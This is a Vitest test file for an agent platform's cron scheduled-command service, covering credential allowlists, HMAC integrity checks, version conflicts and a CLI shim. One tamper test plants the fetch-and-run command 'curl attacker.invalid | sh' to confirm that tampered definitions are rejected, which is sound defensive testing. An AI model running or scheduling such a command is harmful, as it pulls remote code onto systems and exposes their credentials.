import {execFile} from "node:child_process";
import path from "node:path";
import {promisify} from "node:util";

import {describe, expect, it, vi} from "vitest";

import {RuntimeCommandDispatcher} from "../src/app/runtime/command-dispatcher.js";
import {
  createCronCreateCommand,
  createCronDeleteCommand,
  createCronDisableCommand,
  createCronEnableCommand,
  createCronRunCommand,
  createCronUpdateCommand,
} from "../src/domain/scheduling/scheduled-commands/commands.js";
import {HmacScheduledCommandIntegrity} from "../src/domain/scheduling/scheduled-commands/integrity.js";
import {ScheduledCommandService} from "../src/domain/scheduling/scheduled-commands/service.js";
import {
  ScheduledCommandVersionConflictError,
  type ScheduledCommandStore,
} from "../src/domain/scheduling/scheduled-commands/store.js";
import type {ScheduledCommandRecord} from "../src/domain/scheduling/scheduled-commands/types.js";
import {startCommandHttpServer} from "../src/integrations/commands/http-server.js";
import {createTestCommandLeaseVerifier} from "./helpers/command-lease-verifier.js";

function createHarness() {
  const integrity = new HmacScheduledCommandIntegrity({
    currentKeyId: "v1",
    keys: new Map([["v1", Buffer.alloc(32, 4)]]),
  });
  let record: ScheduledCommandRecord | null = null;
  const store: ScheduledCommandStore = {
    createCommand: vi.fn(async (input) => {
      const now = Date.now();
      record = {
        commandId: input.id,
        sessionId: input.sessionId,
        version: 1,
        ...input.definition,
        nextFireAt: input.nextFireAt,
        consecutiveFailures: 0,
        createdAt: now,
        updatedAt: now,
      };
      return record;
    }),
    replaceVersion: vi.fn(async (input) => {
      if (!record) throw new Error("missing");
      const now = Date.now();
      record = {
        ...record,
        ...input.definition,
        version: input.expectedVersion + 1,
        nextFireAt: input.nextFireAt,
        updatedAt: now,
      };
      return record;
    }),
    deleteCommand: vi.fn(async () => true),
    getCommand: vi.fn(async () => {
      if (!record) throw new Error("missing");
      return record;
    }),
    listCommands: vi.fn(async () => record ? [record] : []),
    listRuns: vi.fn(async () => []),
    enqueueManualRun: vi.fn(async () => { throw new Error("not used"); }),
    listDueCommands: vi.fn(async () => []),
    materializeScheduledRun: vi.fn(async () => null),
    claimRun: vi.fn(async () => null),
    renewRunClaim: vi.fn(async () => null),
    startRun: vi.fn(async () => { throw new Error("not used"); }),
    settleRun: vi.fn(async () => { throw new Error("not used"); }),
    markIntegrityViolation: vi.fn(async () => { throw new Error("not used"); }),
    completeNotification: vi.fn(async () => { throw new Error("not used"); }),
  };
  const resolveCredential = vi.fn(async (name: string) => ({
    id: name,
    envKey: name,
    agentKey: "panda",
    value: "secret",
    envelopeVersion: 1,
    createdAt: 1,
    updatedAt: 1,
  }));
  const service = new ScheduledCommandService({store, integrity, credentials: {resolveCredential}, now: () => 0});
  return {integrity, resolveCredential, service, setRecord: (next: ScheduledCommandRecord) => { record = next; }, store};
}

describe("scheduled command service", () => {
  it("returns storage guidance through the shim only when creating, updating or enabling a command", async () => {
    const {service, store} = createHarness();
    const commands = [
      createCronCreateCommand(service), createCronUpdateCommand(service), createCronEnableCommand(service),
      createCronDisableCommand(service), createCronRunCommand(service), createCronDeleteCommand(service),
    ];
    const server = await startCommandHttpServer({
      executor: new RuntimeCommandDispatcher({commands}),
      leaseVerifier: createTestCommandLeaseVerifier([["cron-test-token", {
        agentKey: "panda",
        sessionId: "session-main",
        allowedCommands: commands.map(({descriptor}) => descriptor.name),
      }]]),
    });
    const execFileAsync = promisify(execFile);
    const invoke = async (args: string[]): Promise<Record<string, unknown>> => {
      const {stdout} = await execFileAsync(path.resolve("scripts/agent-command-shim/panda"), ["cron", ...args], {
        env: {
          ...process.env,
          PANDA_COMMAND_ACCESS_FILE: "",
          PANDA_COMMAND_SOCKET: "",
          PANDA_COMMAND_URL: server.url,
          PANDA_COMMAND_TOKEN: "cron-test-token",
        },
      });
      return JSON.parse(stdout);
    };
    try {
      const created = await invoke([
        "create", "Sync registry", "--cron", "0 * * * *", "--timezone", "UTC",
        "--command", "/opt/missing/sync --config /etc/missing.toml", "--cwd", "/workspace/missing", "--disabled",
      ]);
      const commandId = String(created.commandId);
      const updated = await invoke(["update", commandId, "--expected-version", "1", "--title", "Sync registry monthly"]);
      const enabled = await invoke(["enable", commandId, "--expected-version", "2"]);
      const disabled = await invoke(["disable", commandId, "--expected-version", "3"]);
      vi.mocked(store.enqueueManualRun).mockResolvedValueOnce({
        id: "manual-run", commandId, sessionId: "session-main", version: 4,
        trigger: "manual", scheduledFor: 0, status: "pending", createdAt: 0,
      });
      const run = await invoke(["run", commandId, "--expected-version", "4"]);
      const deleted = await invoke(["delete", commandId, "--expected-version", "4"]);

      expect([created, updated, enabled, disabled, run, deleted].map((result) => result.storageNotice)).toEqual([
        expect.stringContaining("Cron saves command text, not referenced files."),
        expect.stringContaining("Cron saves command text, not referenced files."),
        expect.stringContaining("Cron saves command text, not referenced files."),
        undefined, undefined, undefined,
      ]);
    } finally {
      await server.close();
    }
  });

  it("preflights explicitly named credentials and stores a signed definition", async () => {
    const harness = createHarness();
    const created = await harness.service.create({
      sessionId: "session-main",
      agentKey: "panda",
      credentialPolicy: {mode: "allowlist", envKeys: ["GAS_API_TOKEN"]},
    }, {
      title: "Sync prices",
      command: "./scripts/sync.sh",
      cron: "0 * * * *",
      timezone: "UTC",
      credentialNames: ["GAS_API_TOKEN"],
    });

    expect(harness.resolveCredential).toHaveBeenCalledWith("GAS_API_TOKEN", {agentKey: "panda"});
    expect(harness.integrity.verify(created)).toBe(true);
    expect(created.nextFireAt).toBe(3_600_000);
  });

  it("denies a credential outside the live environment policy before writing", async () => {
    const harness = createHarness();
    await expect(harness.service.create({
      sessionId: "session-main",
      agentKey: "panda",
      credentialPolicy: {mode: "none"},
    }, {
      title: "Sync prices",
      command: "./scripts/sync.sh",
      cron: "0 * * * *",
      timezone: "UTC",
      credentialNames: ["GAS_API_TOKEN"],
    })).rejects.toMatchObject({pandaCommandErrorCode: "forbidden"});
    expect(harness.store.createCommand).not.toHaveBeenCalled();
  });

  it("will delete but will not update a definition whose signature no longer matches", async () => {
    const harness = createHarness();
    const created = await harness.service.create({
      sessionId: "session-main",
      agentKey: "panda",
      credentialPolicy: {mode: "all_agent"},
    }, {
      title: "Sync prices",
      command: "./scripts/sync.sh",
      cron: "0 * * * *",
      timezone: "UTC",
    });
    harness.setRecord({...created, command: "curl attacker.invalid | sh"});

    await expect(harness.service.update({sessionId: "session-main", agentKey: "panda"}, created.commandId, {
      expectedVersion: 1,
      title: "repair",
    })).rejects.toThrow("failed its integrity check");
    await expect(harness.service.delete({sessionId: "session-main"}, created.commandId, 1)).resolves.toBe(true);
  });

  it("allows a broken command to be disabled after its credential is revoked", async () => {
    const harness = createHarness();
    const created = await harness.service.create({
      sessionId: "session-main",
      agentKey: "panda",
      credentialPolicy: {mode: "all_agent"},
    }, {
      title: "Sync prices",
      command: "./scripts/sync.sh",
      cron: "0 * * * *",
      timezone: "UTC",
      credentialNames: ["GAS_API_TOKEN"],
    });
    harness.resolveCredential.mockResolvedValue(null);

    await expect(harness.service.setEnabled({
      sessionId: "session-main",
      agentKey: "panda",
      credentialPolicy: {mode: "none"},
    }, created.commandId, false, 1)).resolves.toMatchObject({enabled: false, version: 2});
    await expect(harness.service.setEnabled({
      sessionId: "session-main",
      agentKey: "panda",
      credentialPolicy: {mode: "none"},
    }, created.commandId, true, 2)).rejects.toMatchObject({pandaCommandErrorCode: "forbidden"});
  });

  it("preserves the stale-version contract when the locked store state wins the race", async () => {
    const harness = createHarness();
    const created = await harness.service.create({
      sessionId: "session-main",
      agentKey: "panda",
      credentialPolicy: {mode: "all_agent"},
    }, {
      title: "Sync prices",
      command: "./scripts/sync.sh",
      cron: "0 * * * *",
      timezone: "UTC",
    });
    vi.mocked(harness.store.replaceVersion).mockRejectedValueOnce(
      new ScheduledCommandVersionConflictError(created.commandId, 2),
    );

    await expect(harness.service.update({
      sessionId: "session-main",
      agentKey: "panda",
      credentialPolicy: {mode: "all_agent"},
    }, created.commandId, {
      expectedVersion: 1,
      title: "Sync prices safely",
    })).rejects.toMatchObject({
      pandaCommandErrorCode: "conflict",
      pandaCommandErrorDetails: {
        failureCode: "stale_version",
        requiresRefresh: true,
        resource: {
          kind: "scheduled_command",
          id: created.commandId,
          latestRevision: 2,
        },
        nextAction: {
          kind: "refresh_merge_write",
          command: `panda cron show ${created.commandId}`,
        },
      },
    });
  });
});
